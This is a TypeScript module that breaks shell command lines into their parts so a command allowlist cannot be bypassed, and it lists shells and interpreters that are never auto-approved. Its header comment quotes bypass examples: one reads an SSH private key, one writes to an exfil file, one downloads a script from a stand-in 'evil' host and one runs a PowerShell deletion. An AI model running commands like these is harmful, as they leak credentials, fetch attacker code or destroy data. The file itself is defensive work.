// Shell command decomposition for policy evaluation.
//
// WHY THIS EXISTS: the original policy engine matched an allowlist with
//   clean.toLowerCase().startsWith(allowed)
// That check is defeated by one separator character. "git status; cat ~/.ssh/id_rsa"
// starts with the allowed string "git status" and was therefore ALLOWED, as were
// "git diff > ../exfil.txt", "bun test || wget http://evil/p.sh" and
// "git log && powershell -c Remove-Item".
//
// The fix cannot be a longer denylist: denylists lose that race. This module
// instead refuses to treat a command line as allowlisted unless it is a SINGLE
// simple command the allowlist fully covers. Anything carrying a separator,
// pipeline, redirection, substitution, or background operator is decomposed, and
// every component must independently pass — so an operator the allowlist does not
// understand escalates to a human instead of silently riding along.
//
// This is deliberately a conservative scanner, not a shell parser. Where its
// reading is uncertain it reports what it could not prove safe, and the caller
// fails closed. Under-approximating safety here is the point.

export type ShellOperatorKind =
  /** Semicolon: unconditional sequencing. */
  | "sequence"
  /** Double ampersand / double pipe: conditional sequencing. */
  | "conditional"
  /** Single pipe: pipeline. */
  | "pipe"
  /** Angle brackets: redirection. */
  | "redirect"
  /** Backticks or dollar-paren: command substitution. */
  | "substitution"
  /** Single ampersand: background execution. */
  | "background"
  /** Paren or brace: subshell or group. */
  | "subshell";

export interface ShellSegment {
  /** The simple command text, trimmed. */
  readonly text: string;
}

export interface ShellParseResult {
  /** Individual commands the line would run, in order. */
  readonly segments: readonly ShellSegment[];
  /** Operators found, in order of appearance. */
  readonly operators: readonly ShellOperatorKind[];
  /** True when the line is exactly one simple command and no operator. */
  readonly isSingleSimpleCommand: boolean;
  /** Constructs this scanner saw and could not prove safe. */
  readonly opaqueConstructs: readonly string[];
}

/**
 * Split a command line into simple commands, recording the operators between them.
 *
 * Quote handling is intentionally shallow. A quoted separator is not treated as an
 * operator (so a quoted "a; b" stays one command), but an UNTERMINATED quote is
 * recorded as opaque rather than treated as literal text, because the remainder of
 * the line has an unknown meaning in that case.
 */
export function parseShellCommand(commandLine: string): ShellParseResult {
  const input = String(commandLine ?? "");
  const segments: ShellSegment[] = [];
  const operators: ShellOperatorKind[] = [];
  const opaque: string[] = [];
  let buffer = "";
  let quote: '"' | "'" | null = null;
  let i = 0;

  const pushSegment = (): void => {
    const text = buffer.trim();
    if (text !== "") segments.push({ text });
    buffer = "";
  };

  while (i < input.length) {
    const ch = input[i]!;

    if (quote) {
      buffer += ch;
      if (ch === "\\") {
        buffer += input[i + 1] ?? "";
        i += 2;
        continue;
      }
      if (ch === quote) quote = null;
      i += 1;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch as '"' | "'";
      buffer += ch;
      i += 1;
      continue;
    }

    if (ch === "`") {
      opaque.push("backtick command substitution");
      operators.push("substitution");
      pushSegment();
      const end = input.indexOf("`", i + 1);
      if (end === -1) {
        opaque.push("unterminated backtick substitution");
        i = input.length;
      } else {
        i = end + 1;
      }
      continue;
    }

    if (ch === "$" && input[i + 1] === "(") {
      opaque.push("dollar-paren command substitution");
      operators.push("substitution");
      pushSegment();
      let depth = 1;
      let j = i + 2;
      while (j < input.length && depth > 0) {
        if (input[j] === "(") depth += 1;
        else if (input[j] === ")") depth -= 1;
        j += 1;
      }
      if (depth > 0) opaque.push("unterminated dollar-paren substitution");
      i = j;
      continue;
    }

    if (ch === "&" && input[i + 1] === "&") {
      operators.push("conditional");
      pushSegment();
      i += 2;
      continue;
    }
    if (ch === "|" && input[i + 1] === "|") {
      operators.push("conditional");
      pushSegment();
      i += 2;
      continue;
    }
    if (ch === "|") {
      operators.push("pipe");
      pushSegment();
      i += input[i + 1] === "&" ? 2 : 1;
      continue;
    }
    if (ch === "&") {
      operators.push("background");
      pushSegment();
      i += 1;
      continue;
    }
    if (ch === ";") {
      operators.push("sequence");
      pushSegment();
      i += 1;
      continue;
    }
    if (ch === ">" || ch === "<") {
      operators.push("redirect");
      pushSegment();
      let j = i + 1;
      while (j < input.length && "><&".includes(input[j]!)) j += 1;
      // The redirect TARGET becomes its own segment, so a path like ../exfil.txt
      // reaches the path policy instead of hiding inside the command string.
      let targetStart = j;
      while (targetStart < input.length && /\s/.test(input[targetStart]!)) targetStart += 1;
      let targetEnd = targetStart;
      while (targetEnd < input.length && !/[\s;|&<>]/.test(input[targetEnd]!)) targetEnd += 1;
      const target = input.slice(targetStart, targetEnd).trim();
      if (target !== "" && !/^&?\d+$/.test(target)) {
        segments.push({ text: target });
      }
      i = targetEnd;
      continue;
    }
    if (ch === "(" || ch === "{") {
      operators.push("subshell");
      pushSegment();
      i += 1;
      continue;
    }
    if (ch === ")" || ch === "}") {
      pushSegment();
      i += 1;
      continue;
    }

    buffer += ch;
    i += 1;
  }

  if (quote) opaque.push("unterminated " + quote + " quote");
  pushSegment();

  return {
    segments,
    operators,
    isSingleSimpleCommand: segments.length === 1 && operators.length === 0 && opaque.length === 0,
    opaqueConstructs: opaque,
  };
}

/** First whitespace-delimited token of a command: its program name. */
export function commandProgram(segment: string): string {
  const trimmed = String(segment ?? "").trim();
  if (trimmed === "") return "";
  const match = /^("[^"]*"|'[^']*'|\S+)/.exec(trimmed);
  const token = match?.[1] ?? trimmed;
  const unquoted = token.replace(/^["']|["']$/g, "");
  const parts = unquoted.split(/[\\/]/);
  return parts[parts.length - 1] ?? unquoted;
}

/**
 * Programs that themselves execute arbitrary code. A shell, interpreter, or
 * package runner makes the surrounding allowlist entry meaningless — running a
 * named script is only as safe as that script — so these are never auto-approved
 * regardless of what the allowlist says.
 */
export const CODE_EXECUTION_PROGRAMS: ReadonlySet<string> = new Set([
  "sh",
  "bash",
  "zsh",
  "fish",
  "dash",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
  "wsl",
  "eval",
  "exec",
  "source",
  "node",
  "node.exe",
  "deno",
  "python",
  "python.exe",
  "python3",
  "perl",
  "ruby",
  "php",
]);

